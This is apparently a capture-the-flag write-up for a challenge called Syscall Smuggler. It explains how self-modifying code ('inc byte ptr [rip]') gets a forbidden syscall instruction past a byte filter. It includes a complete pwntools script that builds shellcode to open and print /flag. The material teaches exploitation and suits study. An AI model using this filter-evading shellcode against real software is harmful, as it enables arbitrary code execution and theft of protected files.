# Shellcode Injection - Syscall Smuggler
**Constraint:** The inputted data **cannot** contain any system call bytes (`syscall`, `sysenter`, `int`). Specifically, the byte sequence `0x0f 0x05` is forbidden.

## Analysis

The challenge allows us to execute arbitrary code (RWX memory), but it employs a static filter that checks our input for specific bad bytes (`0x0f 0x05`, which encodes the `syscall` instruction on x86-64).

Since the filter only checks the **input** data before execution, we can use **Self-Modifying Code (SMC)**. We will input a "harmless" byte sequence and programmatically modify it in memory *during execution* to restore the `syscall` instruction.

### The Technique: RIP-Relative Modification

We need to generate `0x0f 0x05`.
We can input `0x0e 0x05` (which passes the filter).
Then, we use an instruction to increment the `0x0e` byte by 1 to make it `0x0f`.

The instruction `inc byte ptr [rip]` is perfect for this. In x86-64, `RIP` relative addressing allows us to modify memory relative to the current instruction pointer.

**The Gadget:**

```assembly
inc byte ptr [rip]      ; Opcode: fe 05 00 00 00 00
.byte 0x0e              ; The byte to be modified (0x0e + 1 = 0x0f)
.byte 0x05              ; The second byte of syscall (unchanged)
```

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

def solve():
    # The "Smuggler" Gadget
    # \xfe\x05\x00\x00\x00\x00  -> inc byte ptr [rip]
    # \x0e                      -> becomes \x0f after increment
    # \x05                      -> stays \x05
    # Resulting execution: syscall
    smuggled_syscall = b"\xfe\x05\x00\x00\x00\x00\x0e\x05"

    # 1. Open the flag file
    # open("/flag", O_RDONLY)
    shellcode = asm('''
        xor rax, rax
        push rax                /* Null terminator */
        mov rbx, 0x67616c662f   /* "/flag" in hex */
        push rbx
        mov rdi, rsp            /* Pointer to "/flag" */
        xor rsi, rsi            /* O_RDONLY */
        mov rax, 2              /* SYS_open */
    ''')
    shellcode += smuggled_syscall

    # 2. Send content to stdout
    # sendfile(1, fd, 0, 1000)
    shellcode += asm('''
        mov rsi, rax            /* fd from open */
        mov rdi, 1              /* stdout */
        xor rdx, rdx            /* offset */
        mov r10, 1000           /* count */
        mov rax, 40             /* SYS_sendfile */
    ''')
    shellcode += smuggled_syscall

    # 3. Exit (Optional, but good practice)
    # exit(0)
    shellcode += asm('''
        mov rax, 60
        xor rdi, rdi
    ''')
    shellcode += smuggled_syscall

    # Verification
    if b"\x0f\x05" in shellcode:
        log.error("Payload still contains bad bytes!")
    else:
        log.success(f"Payload generated (Length: {len(shellcode)} bytes)")
        
        # Run locally (if testing) or write to file
        # p = process('/challenge/syscall-smuggler')
        # p.send(shellcode)
        # p.interactive()
        
        # Save to file for manual piping
        with open("payload", "wb") as f:
            f.write(shellcode)
            log.info("Payload saved to 'payload'. Run: cat payload | /challenge/syscall-smuggler")

if __name__ == "__main__":
    solve()
